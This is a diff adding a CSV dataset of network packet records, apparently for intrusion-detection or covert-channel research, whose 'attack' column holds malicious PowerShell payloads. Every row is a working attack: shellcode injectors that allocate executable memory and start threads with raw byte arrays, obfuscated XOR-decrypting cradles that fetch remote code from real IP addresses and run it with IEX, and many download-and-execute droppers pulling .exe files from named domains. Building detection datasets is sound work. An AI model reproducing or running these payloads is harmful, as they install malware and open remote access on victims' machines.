@@ -1,0 +1,61 @@
+field,src,dst,p_src,p_dst,proto,attack,length [packet],length [bit]
+TOS,13.5.165.135,203.139.121.234,30303,59386,6,"$dTmD = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $dTmD -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xc4,0xbb,0xed,0xad,0x50,0x81,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x58,0x14,0x03,0x58,0xf9,0x4f,0xa5,0x7d,0xe9,0x12,0x46,0x7e,0xe9,0x72,0xce,0x9b,0xd8,0xb2,0xb4,0xe8,0x4a,0x03,0xbe,0xbd,0x66,0xe8,0x92,0x55,0xfd,0x9c,0x3a,0x59,0xb6,0x2b,0x1d,0x54,0x47,0x07,0x5d,0xf7,0xcb,0x5a,0xb2,0xd7,0xf2,0x94,0xc7,0x16,0x33,0xc8,0x2a,0x4a,0xec,0x86,0x99,0x7b,0x99,0xd3,0x21,0xf7,0xd1,0xf2,0x21,0xe4,0xa1,0xf5,0x00,0xbb,0xba,0xaf,0x82,0x3d,0x6f,0xc4,0x8a,0x25,0x6c,0xe1,0x45,0xdd,0x46,0x9d,0x57,0x37,0x97,0x5e,0xfb,0x76,0x18,0xad,0x05,0xbe,0x9e,0x4e,0x70,0xb6,0xdd,0xf3,0x83,0x0d,0x9c,0x2f,0x01,0x96,0x06,0xbb,0xb1,0x72,0xb7,0x68,0x27,0xf0,0xbb,0xc5,0x23,0x5e,0xdf,0xd8,0xe0,0xd4,0xdb,0x51,0x07,0x3b,0x6a,0x21,0x2c,0x9f,0x37,0xf1,0x4d,0x86,0x9d,0x54,0x71,0xd8,0x7e,0x08,0xd7,0x92,0x92,0x5d,0x6a,0xf9,0xfa,0x92,0x47,0x02,0xfa,0xbc,0xd0,0x71,0xc8,0x63,0x4b,0x1e,0x60,0xeb,0x55,0xd9,0x87,0xc6,0x22,0x75,0x76,0xe9,0x52,0x5f,0xbc,0xbd,0x02,0xf7,0x15,0xbe,0xc8,0x07,0x9a,0x6b,0x64,0x0d,0x0c,0x54,0xd1,0x05,0xa9,0x3c,0x20,0x16,0x30,0x06,0xad,0xf0,0x62,0x28,0xfe,0xac,0xc2,0x98,0xbe,0x1c,0xaa,0xf2,0x30,0x42,0xca,0xfc,0x9a,0xeb,0x60,0x13,0x73,0x43,0x1c,0x8a,0xde,0x1f,0xbd,0x53,0xf5,0x65,0xfd,0xd8,0xfa,0x9a,0xb3,0x28,0x76,0x89,0x23,0xd9,0xcd,0xf3,0xe5,0xe6,0xfb,0x9e,0x09,0x73,0x00,0x09,0x5e,0xeb,0x0a,0x6c,0xa8,0xb4,0xf5,0x5b,0xa3,0x7d,0x60,0x24,0xdb,0x81,0x64,0xa4,0x1b,0xd4,0xee,0xa4,0x73,0x80,0x4a,0xf7,0x66,0xcf,0x46,0x6b,0x3b,0x5a,0x69,0xda,0xe8,0xcd,0x01,0xe0,0xd7,0x3a,0x8e,0x1b,0x32,0xbb,0xf2,0xcd,0x7a,0xc9,0x1a,0xce;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$BVEI=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($BVEI.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$BVEI,0,0,0);for (;;){Start-sleep 60};
+",2337,18696
+TOS,100.163.44.160,203.139.113.8,62112,80,6,"(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/tpaesb.exe',""$env:TEMP\Payment.exe"");Start-Process (""$env:TEMP\Payment.exe"")
+",144,1152
+TOS,109.196.225.86,203.139.121.234,52816,30303,6,"[SYsteM.NeT.ServICePOiNTMANagER]::EXPECT100ConTinUe = 0;$WC=NEw-ObjECT SYSTEM.NEt.WEBCliENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeaDERs.ADD('User-Agent',$u);$wC.PROXY = [SyStem.NeT.WEbREqueST]::DeFAulTWEBPRoxy;$WC.PRoxY.CRedeNtiALS = [SYSTEm.Net.CReDeNTIaLCaChE]::DEfAUltNeTwoRKCReDEnTIaLS;$K='E!7y2[}J?CrG/aqH*5WZ4@o^_BYg(#6I';$I=0;[cHAr[]]$b=([CHAr[]]($Wc.DowNlOadStRINg(""http://14.144.144.66:8081/index.asp"")))|%{$_-BXor$k[$I++%$K.LenGtH]};IEX ($b-JoIN'')
+",501,4008
+TOS,138.164.245.77,203.139.121.234,56993,30303,6,"$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xad,0xff,0xcc,0xc0,0x68,0x02,0x00,0xe3,0xad,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
+",2232,17856
+TOS,109.58.252.70,203.139.121.234,30303,36694,6,"$wc=NeW-OBjeCT SYsTem.Net.WEbClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeadeRS.AdD('User-Agent',$u);$WC.PrOxy = [SySTEm.NET.WeBREqUeSt]::DEfAuLtWeBPrOXY;$wC.PrOxy.CredEnTiALs = [SYsTEM.NEt.CredenTiALCACHE]::DeFAUlTNETWORKCrEdENtiaLS;$K='m.]kjJd[SBY3&Le*<2xqzl6{Pr?s8)hC';$I=0;[chaR[]]$B=([cHaR[]]($WC.DOwNlOADStRing(""http://222.230.139.166:80/index.asp"")))|%{$_-bXor$K[$I++%$K.LENgTH]};IEX ($b-joiN'')
+",445,3560
+TOS,116.58.147.90,203.139.121.234,44410,30303,6,"function JDdRbrGihkZnAeTb ( $jCrpFRvHpdVDoyMZzK , $dlYHmHZlPGmNrLqEskalvrHWbxWDt ){(New-Object System.Net.WebClient).DownloadFile( $jCrpFRvHpdVDoyMZzK , $dlYHmHZlPGmNrLqEskalvrHWbxWDt );(New-Object -com Shell.Application).ShellExecute( $dlYHmHZlPGmNrLqEskalvrHWbxWDt ); }
+",272,2176
+TOS,130.85.161.127,203.139.121.234,30303,50356,6,"function kCWxhwCDssgbQyNJJDYZY ( $ObptwaDLLxGOwD , $gkYtNjIlmzPZVDtSrvZWWbhDlVz ){(New-Object System.Net.WebClient).DownloadFile( $ObptwaDLLxGOwD , $gkYtNjIlmzPZVDtSrvZWWbhDlVz );(New-Object -com Shell.Application).ShellExecute( $gkYtNjIlmzPZVDtSrvZWWbhDlVz ); }
+",263,2104
+TOS,117.234.88.39,163.62.71.17,443,61585,6," sleep 1;(.'new-object' 'system.net.webclient').('downloadfile').Invoke('https://h7de6mkn678k.tk/trasmetto','%localappdata%.exe');&'start-process' '%localappdata%.exe'
+",168,1344
+TOS,133.4.84.228,3.192.64.103,46154,443,6,"(New-Object System.Net.WebClient).DownloadFile('http://doc.cherrycoffeeequipment.com/nw/logo.png',""$env:TEMP\grtsndebdgfsytewrw.exe"");Start-Process (""$env:TEMP\grtsndebdgfsytewrw.exe"")
+",185,1480
+TOS,133.4.101.165,54.156.209.62,48196,443,6,"(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/dwnysn.exe',""$env:TEMP\Dropbox.exe"");Start-Process (""$env:TEMP\Dropbox.exe"")
+",144,1152
+TOS,133.4.84.228,3.192.64.103,46172,443,6,"$7d0mK6 = [TyPE]'ENvIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::GETfoLderpaTh('Desktop');(&'New-Object' 'System.nET.wEBCLIEnT').DOwNLoADFile.iNvoKE('https://hawkgrute.men/atrvs','$Des\5733409.exe');&'Start-Process' $Des\5733409.exe
+",230,1840
+TOS,133.4.84.228,54.86.226.217,47052,443,6,"$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gEtfoLdeRpATh('Desktop');(&'New-Object' 'System.Net.WebClient').dowNLoADFilE.iNVoKE('http://mokerton.com/syope','$Des\7187671.exe');&'Start-Process' $Des\7187671.exe
+",228,1824
+TOS,133.4.101.166,35.168.18.86,39274,443,6,"(new-object system.net.webclient).downloadfile('https://formsonat.co/mrb.exe','cfjjrw.exe');start-process 'cfjjrw.exe'
+",119,952
+TOS,133.4.84.228,54.86.226.217,47066,443,6,"(New-Object System.Net.WebClient).DownloadFile('http://www.bryonz.com/emotions/files/lnwe.exe',""$env:TEMP\lnwe.exe"");Start-Process (""$env:TEMP\lnwe.exe"")
+",154,1232
+TOS,133.4.85.105,3.192.64.103,58396,443,6,"$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfoLDERpATh('Desktop');(&'New-Object' 'System.Net.WebClient').dowNLoaDFilE.iNVoKE('http://historicalpers.gq/sfoger','$Des\4786313.exe');&'Start-Process' $Des\4786313.exe
+",234,1872
+TOS,133.4.85.105,3.192.64.103,58420,443,6,"$7d0mK6 = [Type]'eNVIronmENt' ; &'sleep' 31;${Des} = $7d0mk6::gEtFoLDeRpATh('Desktop');(&'New-Object' 'System.Net.WeBClIenT').dOwNLOaDfiLE.INVokE('https://iniwarinta.date/printing_s','$Des\5234648.exe');&'Start-Process' $Des\5234648.exe
+",237,1896
+TOS,133.4.85.105,3.192.64.103,58400,443,6,"(New-Object System.Net.WebClient).DownloadFile('http://185.117.75.43/update.exe',""$env:TEMP\update1x86.exe"");Start-Process (""$env:TEMP\update1x86.exe"")
+",152,1216
+TOS,133.4.85.105,54.86.226.217,54836,443,6,"(New-Object System.Net.WebClient).DownloadFile('http://185.141.25.243/file.exe',""$env:TEMP\filex86.exe"");Start-Process (""$env:TEMP\filex86.exe"")
+",145,1160
+TOS,133.4.101.167,54.221.194.13,41038,443,6,"(New-Object System.Net.WebClient).DownloadFile('http://andersonken4791.pserver.ru/doc.exe','fleeble.exe');Start-Process 'fleeble.exe'
+",134,1072
+TOS,133.4.85.87,3.192.64.103,42020,443,6,"$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETFoLDerpATh('Desktop');(&'New-Object' 'System.Net.WebClient').dOwNLoaDFile.iNvoKE('http://mokerton.com/onion','$Des\6300365.exe');&'Start-Process' $Des\6300365.exe
+",228,1824
+TOS,133.4.85.87,54.86.226.217,55242,443,6,"$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfoLDERpATh('Desktop');(&'New-Object' 'System.Net.WebClient').dowNLoaDFilE.iNVoKE('http://sunyst.co/dfm','$Des\538050.exe');&'Start-Process' $Des\538050.exe
+",221,1768
+TOS,133.4.101.171,54.224.71.108,46584,443,6," sleep 1;(.'new-object' 'system.net.webclient').('downloadfile').Invoke('http://kescloc.co/phb','%temp%.exe');&'start-process' '%temp%.exe'
+",140,1120
+TOS,135.177.15.99,203.139.121.234,30303,49024,6,"$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gEtfoLdeRpATh('Desktop');(&'New-Object' 'System.Net.WebClient').dowNLoADFilE.iNVoKE('http://mokerton.com/syope','$Des\6933895.exe');&'Start-Process' $Des\6933895.exe
+",228,1824
+TOS,135.177.98.249,203.139.121.234,50322,30303,6,"$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfoLDeRpaTh('Desktop');(&'New-Object' 'System.Net.WebClient').dowNLoaDFilE.iNVoKE('https://librez.ga/nlop','$Des\6331659.exe');&'Start-Process' $Des\6331659.exe
+",225,1800
+TOS,133.4.85.105,54.86.226.217,54860,443,6,"(new-object system.net.webclient).downloadfile('http://homerbongasi.com/dotnorm.exe','xxxiv.exe');start-process 'xxxiv.exe'
+",124,992
+TOS,139.196.243.33,203.139.121.234,44750,30303,6,"$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfoLDeRpaTh('Desktop');(&'New-Object' 'System.Net.WebClient').dowNLoaDFilE.iNVoKE('https://librez.ga/nlop','$Des\1336024.exe');&'Start-Process' $Des\1336024.exe
+",225,1800
+TOS,144.196.129.176,203.139.121.234,41568,30303,6,"($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://www.amspeconline.com/123/nana.exe', $dpl);Start-Process $dpl
+",141,1128
+TOS,145.225.239.255,203.139.121.234,56944,30303,6," sleep 1;(.'new-object' 'system.net.webclient').('downloadfile').Invoke('https://temporally.ml/btray','%temp%.exe');&'start-process' '%temp%.exe'
+",146,1168
+TOS,150.110.154.89,203.139.121.234,60830,30303,6,"function DHkDuBsOuyeSQcAuyO ( $NPaRfdcsLmGgTfIKNeDsAos , $TIBNgmtxYOtyMtlbH ){(New-Object System.Net.WebClient).DownloadFile( $NPaRfdcsLmGgTfIKNeDsAos , $TIBNgmtxYOtyMtlbH );(New-Object -com Shell.Application).ShellExecute( $TIBNgmtxYOtyMtlbH ); }
+",248,1984
+TOS,121.20.245.187,163.62.38.66,443,63008,6,"(new-object system.net.webclient).downloadfile('http://ditetec.com/ts.exe','kpivhk.exe');start-process 'kpivhk.exe'
+",116,928
